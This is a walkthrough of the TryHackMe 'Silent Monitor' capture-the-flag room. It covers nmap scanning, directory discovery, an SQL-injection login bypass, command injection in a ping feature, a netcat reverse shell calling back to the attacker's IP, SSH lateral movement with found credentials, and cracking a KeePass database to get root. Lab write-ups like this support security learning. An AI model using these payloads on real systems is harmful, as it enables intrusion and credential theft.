# Silent Monitor CTF | TryHackMe | Muhammad Zaid

<img width="1920" height="489" alt="image" src="https://github.com/user-attachments/assets/b51abd4c-e383-4f6e-82b1-807d29004808" />
lab url = https://tryhackme.com/room/silent-monitor

| Platform   | TryHackMe     |
| ---------- | ------------- |
| Catagory   | Web and Linux |
| Difficulty | Medium        |

### Prerequisites
- Command Line
- Hash Cracking
- Scanning and Enumeration
- Content Discovery
- Exploitation
- Post Exploitation
- Priv Esc
- Web Fundamentals
- Proxy tools
- Reverse Shell
- SQLi
- Command Injection

### Tools Will be used
- Nmap
- dirsearch
- Burpsuite
- Manual Work
- Common Sense
### Attack Path
```
01. Reconnaissance (Nmap Scanning)
          ↓
02. Directory Enumeration
          ↓
03. SQL Injection (Login Bypass)
          ↓
04. Command Injection Exploitation
          ↓
05. Initial Shell Access
          ↓
06. Hardcoded Credential Discovery
          ↓
07. Lateral Movement
          ↓
08. Privilege Escalation
```
## Phase 1 Scanning Using Nmap
in the first phase we are going to scan the target with nmap and find out what is going on the target machine
```bash
nmap -A -T4 <Target-IP> -vv -oN scan.txt
```
`-A` for aggressive scan as it enables advance features of nmap service detection OS fingerprinting basic NSE `-T4` is for the timing and `-vv` for verbose `-oN` for saving thr output of the nmap in a file.
```bash
# Nmap 7.991 scan initiated Wed Nov  4 21:37:12 2026 as: /usr/lib/nmap/nmap --privileged -A -T4 -vv -oN scan.txt 10.113.156.57
Nmap scan report for 10.113.156.57
Host is up, received echo-reply ttl 62 (0.13s latency).
Scanned at 2026-11-04 21:37:13 PKT for 31s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 22:fc:a4:19:8c:ba:8a:c9:66:f7:c4:3c:10:ae:0e:2f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBByNwi3/Pfe3ZC7ZCLIa/YGnS4wnhhLWeaPk4nTsZPoa9HxT8ysKZPFffTyWJfkrr+YzlGGXFVymDe4Yzb/IeDE=
|   256 82:bd:f9:5a:ef:cd:fe:60:1f:b2:33:13:a5:e5:a3:9d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPEdJcfDAFtPVd1ENnYC4ycyO4Tjldg1PuhygUt2moxQ
5050/tcp open  http    syn-ack ttl 62 Werkzeug httpd 2.0.2 (Python 3.10.12)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/4%OT=22%CT=1%CU=40919%PV=Y%DS=3%DC=T%G=Y%TM=6AEB5F
OS:58%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z
OS:%TS=A)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=FE%GCD=1%ISR=10B%TI
OS:=Z%TS=A)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4E8NNT11NW6%O4=M4E8ST11NW6
OS:%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%
OS:W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 39.888 days (since Sat Sep 26 00:18:44 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   124.50 ms 192.168.128.1
2   ...
3   126.42 ms 10.113.156.57

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  4 21:37:44 2026 -- 1 IP address (1 host up) scanned in 31.28 seconds
```
2 ports are open 22 and 5050 the second one is running the http service so our target is that because the other port is 22 and we need credentials for logging into that.
<img width="1920" height="820" alt="image" src="https://github.com/user-attachments/assets/912abcdd-64c9-44d5-9fc4-9ac5c37c5531" />

we have this interface on the web page i search for every interesting things but i couldn't i saw its page source nothing was there and /robots.txt directory that was not present there.

## Step 2 Content Discovery using Diresearch
because we couldn't find any thing in the previous step now we need to discover the hidden content of the web app to escalate our attack surface.
```bash
dirsearch -u htt://IP:5050
```
and after few seconds we found a directory named as `/internal`
<img width="1335" height="385" alt="image" src="https://github.com/user-attachments/assets/32e80e99-5958-4c85-91d5-8d50cfed34d2" />
so lets navigate to this directory. and there i found a login page 
<img width="1916" height="821" alt="image" src="https://github.com/user-attachments/assets/27f4476e-5672-4607-b72d-c7dc1c35299f" />

## Initial Access
the first thing we try after seeing a login page is to enter default creds but they didn't worked so i tried to perform SQli Payloads and it worked the payload was
`' or 1 or ' ` and this payload bypassed the login page 
<img width="1920" height="819" alt="image" src="https://github.com/user-attachments/assets/f4525a57-5f96-4177-9252-f6a1395ae2c3" />
and now we are seeing the internal portal. and if we move to the OS Health tab and there is a feature that ping the IPs that seems to be Command Injection vulenrability.
<img width="1920" height="826" alt="image" src="https://github.com/user-attachments/assets/3bda5997-0bee-4de4-bcfe-0590b4821dc8" />

first i tried many times the payload to get rev shell on my system but that was not working after a few time i noticed that if we add the payload in the second line will it work? i checked that it worked.
### Getting Shell
first i used this tool to get rev shell
https://github.com/brightio/penelope
i installed it you can also install it from one liner command in debian based OS
```bash
sudo apt install penelope
```
after its installation run it as a listener
```bash
penelope -p 4445
```
then i captured the request through my Burp Proxy and send it to repeater and added my payload
```bash
busybox nc 192.168.131.76 4445 -e bash
```
<img width="1920" height="860" alt="image" src="https://github.com/user-attachments/assets/1a8a8be3-ba67-47e9-86ff-440d44ca0e56" />
and when i sent the request i got the rev shell on my listener
<img width="1679" height="282" alt="image" src="https://github.com/user-attachments/assets/6aa2d7f2-4f44-4b13-802e-93cc89385c90" />

first i checked some files there and read their content 
<img width="1031" height="202" alt="image" src="https://github.com/user-attachments/assets/556bd09f-8ac9-464f-ab16-6dbbef285115" />
and its content was this
<img width="1558" height="622" alt="image" src="https://github.com/user-attachments/assets/2c14e801-0fd2-4d3d-9129-3c2efa8f3580" />
containg the sysadmin user's password we can loginto that account using ssh service

## Lateral Movement
we compromised one machine and from that we are moving to another this process is called lateral movement.
in the current session we were unable to run the su command to switch user so i get the ssh shell from another terminal
```bash
ssh sysadmin@IP
```
after logging in and list down the content there we got the user.txt flag.
```bash
cat user.txt
```
## Privelege Escalation
there was another folder named as backup lets navigate to that and saw two files README.txt and infrastructure.kdbx 
lets take this file to our system i ran the python server on the remote shell 
```bash
python3 -m http.server 8000
```
and downloaded that file in my system using wget
```bash
wget http://IP:8080/infrastructure.kdbx
```
<img width="1018" height="117" alt="image" src="https://github.com/user-attachments/assets/abb3bcb4-7724-41fb-9acf-7523ad8234d1" />
On our machine we generate a hash using keepass2john to eventually crack the keepass file. It turns out the file is poorly secured by a weak password.
```bash
keepass2john infrastructure.kdbx > kdbx.hash
```
and now crack it 
```
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
```
and you will get a password.
We unlock the keepass file with the cracked password and are able to retrieve the root users password.
if you don't have installed it on your system downlaod it from here https://keepassxc.org/download/#windows on your system
then open that file and provide that password you recovered from that hash file and you will see the root password 

### Log in as Root
now you have the root's password you can log into that 
```bash
su root
```
<img width="776" height="134" alt="image" src="https://github.com/user-attachments/assets/f3caddb5-7035-44ba-a14a-1e090ac0a284" />

and now you are root read the root.txt contetn
```bash
cat root.txt
```

i hope this will help you a lot.....................
